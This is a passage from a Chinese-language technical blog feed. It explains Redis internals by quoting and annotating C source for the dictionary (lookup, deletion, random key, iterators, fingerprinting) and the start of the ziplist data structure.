he-&gt;next;</span><br><span class="line">                <span class="keyword">if</span> (!nofree) &#123;</span><br><span class="line">                    dictFreeKey(d, he);</span><br><span class="line">                    dictFreeVal(d, he);</span><br><span class="line">                    zfree(he);</span><br><span class="line">                &#125;</span><br><span class="line">                d-&gt;ht[table].used--;</span><br><span class="line">                <span class="keyword">return</span> he;</span><br><span class="line">            &#125;</span><br><span class="line">            prevHe = he;</span><br><span class="line">            he = he-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!dictIsRehashing(d)) <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>; <span class="comment">/* not found */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>分析：</p>
<ul>
<li>每执行一次字典的删除操作，都会调用一次<code>_dictRehashStep</code>，做一次rehash</li>
<li>删除操作同时使用ht[0], ht[1]两张表</li>
</ul>
<p>3、<code>dictFetchValue</code>用于查找字典，返回给定键的值，时间复杂度O(1)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">dictFetchValue</span><span class="params">(dict *d, <span class="type">const</span> <span class="type">void</span> *key)</span> &#123;</span><br><span class="line">    dictEntry *he;</span><br><span class="line">    he = dictFind(d,key);</span><br><span class="line">    <span class="keyword">return</span> he ? dictGetVal(he) : <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">dictEntry *<span class="title function_">dictFind</span><span class="params">(dict *d, <span class="type">const</span> <span class="type">void</span> *key)</span> &#123;</span><br><span class="line">    dictEntry *he;</span><br><span class="line">    <span class="type">uint64_t</span> h, idx, table;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (dictSize(d) == <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> (dictIsRehashing(d)) _dictRehashStep(d); <span class="comment">// 执行一次rehash</span></span><br><span class="line">    h = dictHashKey(d, key);</span><br><span class="line">    <span class="keyword">for</span> (table = <span class="number">0</span>; table &lt;= <span class="number">1</span>; table++) &#123; 		<span class="comment">// 查询操作同时使用ht[0], ht[1]两张表</span></span><br><span class="line">        idx = h &amp; d-&gt;ht[table].sizemask;</span><br><span class="line">        he = d-&gt;ht[table].table[idx];</span><br><span class="line">        <span class="keyword">while</span>(he) &#123;</span><br><span class="line">            <span class="keyword">if</span> (key==he-&gt;key || dictCompareKeys(d, key, he-&gt;key))</span><br><span class="line">                <span class="keyword">return</span> he;</span><br><span class="line">            he = he-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!dictIsRehashing(d)) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>分析：</p>
<ul>
<li>每执行一次字典的查询操作，都会调用一次<code>_dictRehashStep</code>，做一次rehash</li>
<li>查询操作同时使用ht[0], ht[1]两张表</li>
</ul>
<h3 id="字典API"><a href="#字典API" class="headerlink" title="字典API"></a>字典API<span id="jump20"></span></h3><table>
<thead>
<tr>
<th>API</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>dictCreate</td>
<td>创建字典</td>
</tr>
<tr>
<td>dictRelease</td>
<td>释放字典</td>
</tr>
<tr>
<td>dictAdd</td>
<td>新增一个键值对到字典</td>
</tr>
<tr>
<td>dictFetchValue</td>
<td>查找字典，返回给定键的值</td>
</tr>
<tr>
<td>dictDelete</td>
<td>从字典中删除给定键的键值对</td>
</tr>
</tbody></table>
<h4 id="随机返回一个键值对"><a href="#随机返回一个键值对" class="headerlink" title="随机返回一个键值对"></a>随机返回一个键值对<span id="jump21"></span></h4><p>源码参考<code>dictGetRandomKey</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">dictEntry *<span class="title function_">dictGetRandomKey</span><span class="params">(dict *d)</span> &#123;</span><br><span class="line">    dictEntry *he, *orighe;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> h;</span><br><span class="line">    <span class="type">int</span> listlen, listele;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (dictSize(d) == <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> (dictIsRehashing(d)) _dictRehashStep(d);</span><br><span class="line">    <span class="keyword">if</span> (dictIsRehashing(d)) &#123;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="comment">/* We are sure there are no elements in indexes from 0</span></span><br><span class="line"><span class="comment">             * to rehashidx-1 */</span></span><br><span class="line">            h = d-&gt;rehashidx + (random() % (d-&gt;ht[<span class="number">0</span>].size +</span><br><span class="line">                                            d-&gt;ht[<span class="number">1</span>].size -</span><br><span class="line">                                            d-&gt;rehashidx));</span><br><span class="line">            he = (h &gt;= d-&gt;ht[<span class="number">0</span>].size) ? d-&gt;ht[<span class="number">1</span>].table[h - d-&gt;ht[<span class="number">0</span>].size] :</span><br><span class="line">                                      d-&gt;ht[<span class="number">0</span>].table[h];</span><br><span class="line">        &#125; <span class="keyword">while</span>(he == <span class="literal">NULL</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            h = random() &amp; d-&gt;ht[<span class="number">0</span>].sizemask;</span><br><span class="line">            he = d-&gt;ht[<span class="number">0</span>].table[h];</span><br><span class="line">        &#125; <span class="keyword">while</span>(he == <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Now we found a non empty bucket, but it is a linked</span></span><br><span class="line"><span class="comment">     * list and we need to get a random element from the list.</span></span><br><span class="line"><span class="comment">     * The only sane way to do so is counting the elements and</span></span><br><span class="line"><span class="comment">     * select a random index. */</span></span><br><span class="line">    listlen = <span class="number">0</span>;</span><br><span class="line">    orighe = he;</span><br><span class="line">    <span class="keyword">while</span>(he) &#123;</span><br><span class="line">        he = he-&gt;next;</span><br><span class="line">        listlen++;</span><br><span class="line">    &#125;</span><br><span class="line">    listele = random() % listlen;</span><br><span class="line">    he = orighe;</span><br><span class="line">    <span class="keyword">while</span>(listele--) he = he-&gt;next;</span><br><span class="line">    <span class="keyword">return</span> he;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>分析：</p>
<ul>
<li><p>实现思路是：先随机选取一个非空的桶，再随机选取链表中的一个节点。</p>
</li>
<li><p>理想情况下，哈希表中的每个链表的长度为1，所以这里用O(N)复杂度随机获取链表节点是完全可以接受的，不记录链表长度目的是为了节省内存。</p>
</li>
</ul>
<h4 id="字典迭代器的实现"><a href="#字典迭代器的实现" class="headerlink" title="字典迭代器的实现"></a>字典迭代器的实现<span id="jump22"></span></h4><h5 id="1、先看下字典迭代器的结构体定义"><a href="#1、先看下字典迭代器的结构体定义" class="headerlink" title="1、先看下字典迭代器的结构体定义"></a>1、先看下字典迭代器的结构体定义</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* If safe is set to 1 this is a safe iterator, that means, you can call</span></span><br><span class="line"><span class="comment"> * dictAdd, dictFind, and other functions against the dictionary even while</span></span><br><span class="line"><span class="comment"> * iterating. Otherwise it is a non safe iterator, and only dictNext()</span></span><br><span class="line"><span class="comment"> * should be called while iterating. */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">dictIterator</span> &#123;</span></span><br><span class="line">    dict *d;</span><br><span class="line">    <span class="type">long</span> index;						<span class="comment">// 当前遍历到的哈希表中的索引值</span></span><br><span class="line">    <span class="type">int</span> table;						<span class="comment">// 取值只能是0或1</span></span><br><span class="line">    <span class="type">int</span> safe;						<span class="comment">// 表示这个迭代器是否是安全的，1表示安全，0表示不安全</span></span><br><span class="line">    dictEntry *entry, *nextEntry;	<span class="comment">// 迭代器指向的当前元素，以及下一个要遍历的元素</span></span><br><span class="line">    <span class="comment">/* unsafe iterator fingerprint for misuse detection. */</span></span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> fingerprint;			<span class="comment">// 字典的指纹</span></span><br><span class="line">&#125; dictIterator;</span><br></pre></td></tr></table></figure>

<p>1、safe成员为1，表示这个迭代器是安全的。安全指的是遍历过程中允许对字典做修改操作，且迭代中不会出现元素重复。所以当字典绑定了安全迭代器时，Redis不允许出现rehash操作，源码参考：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> _dictRehashStep(dict *d) &#123;</span><br><span class="line">    <span class="keyword">if</span> (d-&gt;iterators == <span class="number">0</span>) dictRehash(d,<span class="number">1</span>);	<span class="comment">// 只有未绑定安全迭代器时，才执行dictRehash</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>safe成员为0，表示这个迭代器是不安全的。不安全指的是遍历过程中不允许修改这个字典，且遍历过程中可能出现重复元素。它的优点在于允许rehash。</p>
<p>2、fingerprint为字典的指纹，在首次迭代时生成指纹，销毁迭代器时比较指纹，如果两者不一致，说明出现异常，程序退出。源码参考：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">dictReleaseIterator</span><span class="params">(dictIterator *iter)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!(iter-&gt;index == <span class="number">-1</span> &amp;&amp; iter-&gt;table == <span class="number">0</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (iter-&gt;safe)</span><br><span class="line">            iter-&gt;d-&gt;iterators--;		<span class="comment">// 计数减1，允许rehash操作</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            assert(iter-&gt;fingerprint == dictFingerprint(iter-&gt;d));	<span class="comment">// 比较指纹</span></span><br><span class="line">    &#125;</span><br><span class="line">    zfree(iter);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>指纹的生成方法参考<code>dictFingerprint</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">long</span> <span class="type">long</span> <span class="title function_">dictFingerprint</span><span class="params">(dict *d)</span> &#123;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> integers[<span class="number">6</span>], hash = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> j;</span><br><span class="line"></span><br><span class="line">    integers[<span class="number">0</span>] = (<span class="type">long</span>) d-&gt;ht[<span class="number">0</span>].table;</span><br><span class="line">    integers[<span class="number">1</span>] = d-&gt;ht[<span class="number">0</span>].size;</span><br><span class="line">    integers[<span class="number">2</span>] = d-&gt;ht[<span class="number">0</span>].used;</span><br><span class="line">    integers[<span class="number">3</span>] = (<span class="type">long</span>) d-&gt;ht[<span class="number">1</span>].table;</span><br><span class="line">    integers[<span class="number">4</span>] = d-&gt;ht[<span class="number">1</span>].size;</span><br><span class="line">    integers[<span class="number">5</span>] = d-&gt;ht[<span class="number">1</span>].used;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* We hash N integers by summing every successive integer with the integer</span></span><br><span class="line"><span class="comment">     * hashing of the previous sum. Basically:</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Result = hash(hash(hash(int1)+int2)+int3) ...</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * This way the same set of integers in a different order will (likely) hash</span></span><br><span class="line"><span class="comment">     * to a different number. */</span></span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">6</span>; j++) &#123;</span><br><span class="line">        hash += integers[j];</span><br><span class="line">        <span class="comment">/* For the hashing step we use Tomas Wang&#x27;s 64 bit integer hash. */</span></span><br><span class="line">        hash = (~hash) + (hash &lt;&lt; <span class="number">21</span>); <span class="comment">// hash = (hash &lt;&lt; 21) - hash - 1;</span></span><br><span class="line">        hash = hash ^ (hash &gt;&gt; <span class="number">24</span>);</span><br><span class="line">        hash = (hash + (hash &lt;&lt; <span class="number">3</span>)) + (hash &lt;&lt; <span class="number">8</span>); <span class="comment">// hash * 265</span></span><br><span class="line">        hash = hash ^ (hash &gt;&gt; <span class="number">14</span>);</span><br><span class="line">        hash = (hash + (hash &lt;&lt; <span class="number">2</span>)) + (hash &lt;&lt; <span class="number">4</span>); <span class="comment">// hash * 21</span></span><br><span class="line">        hash = hash ^ (hash &gt;&gt; <span class="number">28</span>);</span><br><span class="line">        hash = hash + (hash &lt;&lt; <span class="number">31</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> hash;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h5 id="2、迭代器初始化"><a href="#2、迭代器初始化" class="headerlink" title="2、迭代器初始化"></a>2、迭代器初始化</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">dictIterator *<span class="title function_">dictGetIterator</span><span class="params">(dict *d)</span> &#123;</span><br><span class="line">    dictIterator *iter = zmalloc(<span class="keyword">sizeof</span>(*iter));</span><br><span class="line">    iter-&gt;d = d;</span><br><span class="line">    iter-&gt;table = <span class="number">0</span>;</span><br><span class="line">    iter-&gt;index = <span class="number">-1</span>;</span><br><span class="line">    iter-&gt;safe = <span class="number">0</span>;</span><br><span class="line">    iter-&gt;entry = <span class="literal">NULL</span>;</span><br><span class="line">    iter-&gt;nextEntry = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> iter;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">dictIterator *<span class="title function_">dictGetSafeIterator</span><span class="params">(dict *d)</span> &#123;</span><br><span class="line">    dictIterator *i = dictGetIterator(d);</span><br><span class="line"></span><br><span class="line">    i-&gt;safe = <span class="number">1</span>;	<span class="comment">// 安全迭代器和非安全迭代器初始化的区别就是safe成员不同而已！</span></span><br><span class="line">    <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看出，安全迭代器和非安全迭代器初始化的区别就是safe成员不同而已。</p>
<h5 id="3、遍历下一个节点"><a href="#3、遍历下一个节点" class="headerlink" title="3、遍历下一个节点"></a>3、遍历下一个节点</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">dictEntry *<span class="title function_">dictNext</span><span class="params">(dictIterator *iter)</span> &#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (iter-&gt;entry == <span class="literal">NULL</span>) &#123;		<span class="comment">// 如果为空，遍历下一个索引</span></span><br><span class="line">            dictht *ht = &amp;iter-&gt;d-&gt;ht[iter-&gt;table];</span><br><span class="line">            <span class="keyword">if</span> (iter-&gt;index == <span class="number">-1</span> &amp;&amp; iter-&gt;table == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (iter-&gt;safe)</span><br><span class="line">                    iter-&gt;d-&gt;iterators++;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    iter-&gt;fingerprint = dictFingerprint(iter-&gt;d);	<span class="comment">// 如果是非安全迭代器，计算指纹</span></span><br><span class="line">            &#125;</span><br><span class="line">            iter-&gt;index++;</span><br><span class="line">            <span class="keyword">if</span> (iter-&gt;index &gt;= (<span class="type">long</span>) ht-&gt;size) &#123;	<span class="comment">// 如果当前哈希表是ht[0]且遍历完成，尝试遍历ht[1]</span></span><br><span class="line">                <span class="keyword">if</span> (dictIsRehashing(iter-&gt;d) &amp;&amp; iter-&gt;table == <span class="number">0</span>) &#123;</span><br><span class="line">                    iter-&gt;table++;</span><br><span class="line">                    iter-&gt;index = <span class="number">0</span>;</span><br><span class="line">                    ht = &amp;iter-&gt;d-&gt;ht[<span class="number">1</span>];</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            iter-&gt;entry = ht-&gt;table[iter-&gt;index];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;	<span class="comment">// 否则，遍历当前链表的下一个元素</span></span><br><span class="line">            iter-&gt;entry = iter-&gt;nextEntry;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (iter-&gt;entry) &#123;</span><br><span class="line">            <span class="comment">/* We need to save the &#x27;next&#x27; here, the iterator user</span></span><br><span class="line"><span class="comment">             * may delete the entry we are returning. */</span></span><br><span class="line">            iter-&gt;nextEntry = iter-&gt;entry-&gt;next;</span><br><span class="line">            <span class="keyword">return</span> iter-&gt;entry;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>简要概括，这个遍历操作就是从ht[0]到ht[1]，再沿着哈希表数组往下遍历。</p>
<h4 id="dictScan算法"><a href="#dictScan算法" class="headerlink" title="dictScan算法"></a>dictScan算法<span id="jump23"></span></h4><p>dictScan算法用于遍历字典，是Redis字典源码中最为精妙，同时也是最难理解的算法。</p>
<p><strong>字典遍历算法的复杂性分析</strong></p>
<p>Redis字典涉及Rehash操作，如果在两次遍历键之间，字典发生了扩展或收缩，就会导致哈希键的索引值变化。字典遍历算法实现的难点在于<font color = 'red'><strong>如何保证字典中原有元素都能被遍历到，且迭代到的重复元素尽可能地少</strong></font></p>
<p>Redis实现的dictScan算法特点如下：</p>
<ul>
<li><p>开始遍历时的所有元素，只要不被删除都能被返回</p>
</li>
<li><p>rehash过程中，算法可能返回重复元素，遍历过程中新增或删除的key可能返回，可能不返回。</p>
</li>
</ul>
<p><strong>具体实现分析：</strong></p>
<p>先挖个坑，后续再填。。。。。。</p>
<p>网上已有非常深入的分析，推荐这篇：<a href="https://tech.meituan.com/2018/07/27/redis-rehash-practice-optimization.html">美团针对Redis Rehash机制的探索和实践</a></p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>【1】《Redis设计与实现》 第4章 字典</p>
<p>【2】<a href="https://juejin.cn/post/6844903702373859335">Copy On Write机制了解一下</a></p>
<p>【3】<a href="https://tech.meituan.com/2018/07/27/redis-rehash-practice-optimization.html">美团针对Redis Rehash机制的探索和实践</a></p>
<p>【4】<a href="https://cloud.tencent.com/developer/article/1672781">解决哈希冲突的常用方法分析</a></p>
]]></content>
      <categories>
        <category>Redis</category>
      </categories>
      <tags>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis学习笔记(四)——ziplist</title>
    <url>/2021/12/30/2021-12-30-redis-note-04-ziplist/</url>
    <content><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>ziplist是一种为节约内存而开发的数据结构，本质是一个字节数组。</p>
<p>ziplist是列表键和哈希键的底层实现之一，也用于quicklist的实现。</p>
<span id="more"></span>

<h2 id="问题思考"><a href="#问题思考" class="headerlink" title="问题思考"></a>问题思考</h2><p>双向链表结构，在<font color = 'red'>存储数据本身长度远小于链表节点大小</font>的场景下，有严重的内存浪费问题。针对这种情况，Redis设计了ziplist这种节约内存的数据结构。以下给出ziplist相关的思考问题，了解ziplist的实现原理和设计思路。</p>
<ul>
<li><a href="#jump1">ziplist的数据结构</a></li>
<li><a href="#jump2">ziplist节点构成</a></li>
<li><a href="#jump3">为什么要设计ziplist</a></li>
<li><a href="#jump4">ziplist相关操作</a><ul>
<li><a href="#jump5">查找指定节点</a></li>
<li><a href="#jump6">连锁更新问题</a></li>
</ul>
</li>
<li>quicklist的数据结构</li>
<li>为什么要设计quicklist</li>
<li>quicklist的增、删、改、查操作</li>
</ul>
<h3 id="ziplist的数据结构"><a href="#ziplist的数据结构" class="headerlink" title="ziplist的数据结构"></a>ziplist的数据结构<span id="jump1"></span></h3><p>Redis没有专门定义结构体来表示ziplist，因为ziplist本质就是一个空间连续的字节数组。</p>
<p>ziplist中包含多个节点(entry)，每个节点存储一个字符串值或整数值，每个节点通过<code>struct zlentry</code>结构表示。</p>
<p>ziplist的各组成部分参考如下：<br><img src="/2021/12/30/2021-12-30-redis-note-04-ziplist/image1.png"></p>
<p>可以看出，ziplist由列表头 + 列表节点 + 列表尾这三部分组成。每个组成部分作用说明如下：</p>
<ul>
<li><code>zlbytes</code>占4字节，用于记录整个ziplist占用内存的总字节数，对于空表来说，<code>zlbytes</code>等于11，源码参考<code>ziplistNew</code></li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> ZIPLIST_HEADER_SIZE     (sizeof(uint32_t)*2+sizeof(uint16_t)) <span class="comment">// 8 + 2 = 10字节</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ZIPLIST_END_SIZE        (sizeof(uint8_t)) <span class="comment">// 1字节</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ZIPLIST_BYTES(zl)       (*((uint32_t*)(zl)))  <span class="comment">// zlbytes</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Create a new empty ziplist. */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *<span class="title function_">ziplistNew</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> bytes = ZIPLIST_HEADER_SIZE+ZIPLIST_END_SIZE;	<span class="comment">// zlbytes = 10 + 1 = 11</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *zl = zmalloc(bytes); <span class="comment">// 可以看出，空表分配11字节大小空间</span></span><br><span class="line">    ZIPLIST_BYTES(zl) = intrev32ifbe(bytes);</span><br><span class="line">    ZIPLIST_TAIL_OFFSET(zl) = intrev32ifbe(ZIPLIST_HEADER_SIZE);</span><br><span class="line">    ZIPLIST_LENGTH(zl) = <span class="number">0</span>;</span><br><span class="line">    zl[bytes<span class="number">-1</span>] = ZIP_END;</span><br><span class="line">    <span class="keyword">return</span> zl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ziplist为空时的内存空间如下图：<br><img src="/2021/12/30/2021-12-30-redis-note-04-ziplist/image2.png"></p>
<ul>
<li><code>zltail</code>占4字节，用于记录表尾节点首地址距离ziplist起始地址有多少字节。设计这个字段的目的是为了快速定位表尾节点地址（ZIPLIST_ENTRY_TAIL)。</li>
<li><code>zllen</code>占2字节，用于记录列表节点总数。注意<code>zllen</code>等于65535时，表示这个列表长度太大，必须通过遍历整个ziplist才能得到真实的长度。参考<code>ziplistLen</code>实现：</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> UINT16_MAX 65535</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">ziplistLen</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *zl)</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> len = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (intrev16ifbe(ZIPLIST_LENGTH(zl)) &lt; UINT16_MAX) &#123;</span><br><span class="line">        len = intrev16ifbe(ZIPLIST_LENGTH(zl)); <span class="comment">// zllen &lt; 65535时，O(1)复杂度获取ziplist长度</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> *p = zl+ZIPLIST_HEADER_SIZE;</span><br><span class="line">        <span class="keyword">while</span> (*p != ZIP_END) &#123;			<span class="comment">// zllen = 65535时，O(N)复杂度获取ziplist长度</span></span><br><span class="line">            p += zipRawEntryLength(p);</span><br><span class="line">            len++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Re-store length if small enough */</span></span><br><span class="line">        <span class="keyword">if</span> (len &lt; UINT16_MAX) ZIPLIST_LENGTH(zl) = intrev16ifbe(len);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> len;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>zlend</code>占1字节，用于标记ziplist的结束，内容固定为0xFF(十进制的255)</li>
</ul>
<h3 id="ziplist节点构成"><a href="#ziplist节点构成" class="headerlink" title="ziplist节点构成"></a>ziplist节点构成<span id="jump2"></span></h3><p>ziplist中包含多个节点(entry)，每个节点存储一个字符串值或整数值，每个节点通过struct zlentry结构表示。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">zlentry</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> prevrawlensize; <span class="comment">/* Bytes used to encode the previous entry len*/</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> prevrawlen;     <span class="comment">/* Previous entry len. */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> lensize;        <span class="comment">/* Bytes used to encode this entry type/len.</span></span><br><span class="line"><span class="comment">                                    For example strings have a 1, 2 or 5 bytes</span></span><br><span class="line"><span class="comment">                                    header. Integers always use a single byte.*/</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> len;            <span class="comment">/* Bytes used to represent the actual entry.</span></span><br><span class="line"><span class="comment">                                    For strings this is just the string length</span></span><br><span class="line"><span class="comment">                                    while for integers it is 1, 2, 3, 4, 8 or</span></span><br><span class="line"><span class="comment">                                    0 (for 4 bit immediate) depending on the</span></span><br><span class="line"><span class="comment">                                    number range. */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> headersize;     <span class="comment">/* prevrawlensize + lensize. */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> encoding;      <span class="comment">/* Set to ZIP_STR_* or ZIP_INT_* depending on</span></span><br><span class="line"><span class="comment">                                    the entry encoding. However for 4 bits</span></span><br><span class="line"><span class="comment">                                    immediate integers this can assume a range</span></span><br><span class="line"><span class="comment">                                    of values and must be range-checked. */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *p;            <span class="comment">/* Pointer to the very start of the entry, that</span></span><br><span class="line"><span class="comment">                                    is, this points to prev-entry-len field. */</span></span><br><span class="line">&#125; zlentry;</span><br></pre></td></tr></table></figure>

<p>前面提到，ziplist本质是一个字节数组，Redis为了操作方便，才专门定义zlentry结构体，并解析某个entry的信息到zlentry中，<strong>注意ziplist字节数组本身并不存储zlentry；</strong> ziplist的每个entry结构都由三部分组成：</p>
<ul>
<li>前一节点长度信息：<code>previous_entry_length</code></li>
<li>当前节点编码信息：<code>encoding</code></li>
<li>当前节点内容：<code>content</code></li>
</ul>
<p>ziplist节点的各组成部分示意图：<br><img src="/2021/12/30/2021-12-30-redis-note-04-ziplist/image3.png"></p>
<p>以下分别介绍这三个组成部分：</p>
<h4 id="1、前一节点长度信息-previous-entry-length"><a href="#1、前一节点长度信息-previous-entry-length" class="headerlink" title="1、前一节点长度信息 previous_entry_length"></a>1、前一节点长度信息 previous_entry_length</h4><p><code>previous_entry_length</code>本身占1字节或5字节，用于记录前一个节点的长度，单位为字节：</p>
<ul>
<li>如果前一个节点长度小于254字节，<code>previous_entry_length</code>就只占1字节，直接保存前一个节点长度。</li>
<li>如果前一个节点长度大于等于254字节，<code>previous_entry_length</code>就占5字节，其中第一个字节固定为0xFE，后4个字节保存前一个节点长度。</li>
</ul>
<p>源码参考<code>ZIP_DECODE_PREVLENSIZE</code>，这个宏根据前一个节点长度，返回<code>previous_entry_length</code>占用的字节数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> ZIP_BIG_PREVLEN 254</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ZIP_DECODE_PREVLENSIZE(ptr, prevlensize) do &#123;                          \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> ((ptr)[0] &lt; ZIP_BIG_PREVLEN) &#123;                                          \</span></span><br><span class="line"><span class="meta">        (prevlensize) = 1;                                                     \</span></span><br><span class="line"><span class="meta">    &#125; <span class="keyword">else</span> &#123;                                                                   \</span></span><br><span class="line"><span class="meta">        (prevlensize) = 5;                                                     \</span></span><br><span class="line"><span class="meta">    &#125;                                                                          \</span></span><br><span class="line"><span class="meta">&#125; while(0)</span></span><br></pre></td></tr></table></figure>

<p>Q：为什么要设计<code>previous_entry_length</code>字段，有什么作用？</p>
<p>A：用于支持从表尾向表头方向遍历。比如我们有指向某个节点起始地址的指针p，用p减去这个节点的<code>previous_entry_length</code>，就能得到前一节点的起始地址。</p>
<p>访问ziplist当前节点的前一个节点，参考源码<code>ziplistPrev</code>的实现：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Return pointer to previous entry in ziplist. */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *<span class="title function_">ziplistPrev</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *zl, <span class="type">unsigned</span> <span class="type">char</span> *p)</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> prevlensize, prevlen = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (p[<span class="number">0</span>] == ZIP_END) &#123;	<span class="comment">// p指向ZIPLIST_ENTRY_END，前一个节点就是最后一个节点，即ZIPLIST_ENTRY_TAIL</span></span><br><span class="line">        p = ZIPLIST_ENTRY_TAIL(zl);</span><br><span class="line">        <span class="keyword">return</span> (p[<span class="number">0</span>] == ZIP_END) ? <span class="literal">NULL</span> : p;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (p == 